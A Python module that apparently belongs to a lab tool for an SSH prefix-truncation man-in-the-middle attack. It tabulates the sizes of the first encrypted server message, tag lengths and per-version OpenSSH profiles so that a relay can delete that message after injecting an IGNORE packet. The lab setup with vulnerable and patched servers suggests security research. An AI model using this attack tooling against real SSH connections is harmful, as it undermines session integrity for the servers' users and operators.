#!/usr/bin/env python3
"""
Roadmap item 2, "Full truncation": pairing the existing IGNORE injection
with a compensating deletion of one server->client post-NEWKEYS message.

Why this needs a lookup table instead of just parsing one more packet:
once NEWKEYS has been sent, everything server->client is ciphertext. For
AES-*-GCM and the *-etm@openssh.com MACs the 4-byte length field is sent
unencrypted (only authenticated), so the relay reads it directly -- see
length_is_visible_on_wire() -- and no profile is needed. For
chacha20-poly1305@openssh.com (and any other cipher paired with a
non-ETM MAC, e.g. legacy aes128-cbc + hmac-sha2-256), the length field
itself is encrypted, so the relay cannot measure the first record's
length on the wire; it must already know, for that implementation and
version, how many bytes the first post-NEWKEYS message will be, and
delete that many bytes blind.

CALIBRATION STATUS: see scripts/calibrate_truncation.py and ATTACK_README.md
"What's validated" for the full method and raw logs. Summary of what was
actually measured, against a REAL OpenSSH 9.6p1 binary (this lab's
patched-pin version, 1:9.2p1-2+deb12u2 is the exact pin but only 9.6p1 was
installable in this sandbox -- see caveat below) running locally, with a
real `ssh` client forcing each cipher/MAC combination through this
module's own handshake-parsing code:

  cipher                                  | s2c MAC            | 1st post-NEWKEYS record (wire bytes) | length visible?
  aes128-gcm@openssh.com                  | (AEAD, implicit)   | 292 = 4 (length) + 272 (payload) + 16 (GCM tag)        | YES
  aes128-ctr                              | hmac-sha2-256-etm  | 308 = 4 (length) + 272 (payload) + 32 (HMAC-SHA256 tag)| YES
  chacha20-poly1305@openssh.com           | (AEAD, implicit)   | 284 total, reproduced identically in 3/3 trials        | NO

The GCM and ETM rows independently confirm the SAME 272-byte plaintext
payload (expected: EXT_INFO content doesn't depend on cipher), which
cross-validates the method. The chacha20 row is 8 bytes smaller at 284 --
consistent with chacha20-poly1305's different padding/block-size rule
producing less random padding for the same logical payload, not a
different message. Measured via an idle-gap recv()-boundary detector
(no raw packet capture: tcpdump produced 0 captured packets in this
sandbox despite matching 80 packets by its own BPF filter -- almost
certainly blocked by the container runtime's syscall filtering, so this
sandbox cannot do AF_PACKET capture at all). This is the SAME edge
real on-path tooling relies on (a quiet link, TCP_NODELAY, one write()
per SSH record arriving as one segment), not a protocol guarantee -- a
busier link could coalesce or split records differently.

CAVEAT -- NOT YET CONFIRMED for this lab's actual containers: this
sandbox could only install OpenSSH 9.6p1 (patched/strict-kex-capable).
The lab's real pins are 9.2p1-2+deb12u1 (vulnerable) and 9.2p1-2+deb12u2
(patched) -- both older than 9.6p1 and from Debian rather than Ubuntu.
EXT_INFO's extension list (and therefore its exact length) is a function
of what the server offers, which CAN differ across OpenSSH point
releases. The chacha20 entry below is recorded against the "OpenSSH_9.6"
banner substring for that reason, with a separate, still-unmeasured
placeholder entry for "OpenSSH_9.2" -- re-run
scripts/calibrate_truncation.py against the real tp-server /
tp-server-patched containers (which this sandbox has no Docker to reach)
before trusting the 9.2p1 number. Dropbear, Gitea, and russh were not
reachable here either and have their own placeholder entries.
"""

from __future__ import annotations

from dataclasses import dataclass

VISIBLE_LENGTH_CIPHERS = {
    # length field is sent unencrypted / only MAC-authenticated; relay.py
    # reads it directly and never needs a profile for these.
    "aes128-gcm@openssh.com",
    "aes256-gcm@openssh.com",
}
# any "*-etm@openssh.com" MAC also makes the length field visible regardless
# of cipher; relay.py checks the negotiated MAC name for that suffix too.
# Empirically confirmed for both cases against real OpenSSH 9.6p1 -- see
# the module docstring above.

# Trailing authentication-tag/MAC size, in bytes, appended AFTER the
# declared length + payload for each "visible-length" pairing -- these
# bytes must also be consumed when deleting a visible-length record, or
# the deletion under-reads and desyncs the stream (a real bug this
# calibration run caught: see ATTACK_README.md "Known gaps, now fixed").
# GCM (16 bytes) and hmac-sha2-256-etm (32 bytes) are EMPIRICALLY
# CONFIRMED above; the rest follow directly from each algorithm's
# standard/fixed digest or tag size (same construction, not separately
# measured here).
AEAD_TAG_SIZES = {
    "aes128-gcm@openssh.com": 16,
    "aes256-gcm@openssh.com": 16,
}
ETM_MAC_TAG_SIZES = {
    "hmac-sha2-256-etm@openssh.com": 32,  # confirmed empirically above
    "hmac-sha2-512-etm@openssh.com": 64,  # SHA-512 digest size, not separately measured
    "hmac-sha1-etm@openssh.com": 20,      # SHA-1 digest size, not separately measured
    "hmac-md5-etm@openssh.com": 16,       # MD5 digest size, not separately measured
}


def trailing_tag_bytes(cipher: str, mac: str) -> int:
    """Bytes to additionally consume after length+payload for a visible-length record."""
    if cipher in AEAD_TAG_SIZES:
        return AEAD_TAG_SIZES[cipher]
    return ETM_MAC_TAG_SIZES.get(mac, 0)


@dataclass(frozen=True)
class TruncationProfile:
    first_message_bytes: int   # on-the-wire length of the first post-NEWKEYS s2c record
    confirmed: bool            # False = placeholder, not yet measured
    source: str


# Keyed by (server banner substring, cipher name). Matched by substring on
# the banner so e.g. "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u1" matches
# "OpenSSH_9.2".
PROFILES: dict[tuple[str, str], TruncationProfile] = {
    ("OpenSSH_9.6", "chacha20-poly1305@openssh.com"): TruncationProfile(
        first_message_bytes=284,
        confirmed=True,
        source="measured against a real, locally-installed OpenSSH_9.6p1 Ubuntu-3ubuntu13.20 "
               "binary, 3/3 identical trials via scripts/calibrate_truncation.py's idle-gap "
               "recv()-boundary method; cross-checked against the aes128-gcm and "
               "aes128-ctr+hmac-sha2-256-etm pairings on the SAME server, which independently "
               "confirmed the same 272-byte EXT_INFO payload (284 = that payload's chacha20 "
               "framing, 8 bytes less than GCM/ETM's due to chacha20-poly1305's different "
               "padding rule). NOT yet confirmed against this lab's actual pinned 9.2p1 build "
               "or against a server with a different EXT_INFO extension set.",
    ),
    ("OpenSSH_9.2", "chacha20-poly1305@openssh.com"): TruncationProfile(
        first_message_bytes=0,
        confirmed=False,
        source="UNMEASURED placeholder -- this lab's actual vulnerable pin "
               "(1:9.2p1-2+deb12u1) was not available to build/run in this "
               "sandbox (no Docker here). The 9.6p1 measurement above is the "
               "closest available data point but EXT_INFO content is "
               "version-dependent -- re-run scripts/calibrate_truncation.py "
               "against the real tp-server container before trusting this "
               "for 9.2p1 specifically.",
    ),
    ("dropbear", "chacha20-poly1305@openssh.com"): TruncationProfile(
        first_message_bytes=0,
        confirmed=False,
        source="UNMEASURED -- Dropbear was not available to build/run in "
               "this sandbox either. Dropbear does not send EXT_INFO by "
               "default in older releases; the first s2c message may "
               "instead be SSH_MSG_SERVICE_ACCEPT, with a different "
               "(likely much smaller and more predictable) length. "
               "Measure before assuming either way.",
    ),
}


def lookup(server_banner: str, cipher: str) -> TruncationProfile | None:
    for (banner_substr, profile_cipher), profile in PROFILES.items():
        if profile_cipher == cipher and banner_substr in server_banner:
            return profile
    return None


def length_is_visible_on_wire(cipher: str, mac: str) -> bool:
    """True if relay.py can read the real 4-byte length field directly.

    Empirically confirmed (not just read from RFC text) by
    scripts/calibrate_truncation.py against a real OpenSSH 9.6p1 binary:
    aes128-gcm@openssh.com and aes128-ctr+hmac-sha2-256-etm@openssh.com
    both gave a plausible length field; aes128-cbc+hmac-sha2-256 (non-etm)
    did not -- the bytes at that offset were not a sane length at all.
    """
    return cipher in VISIBLE_LENGTH_CIPHERS or mac.endswith("-etm@openssh.com")
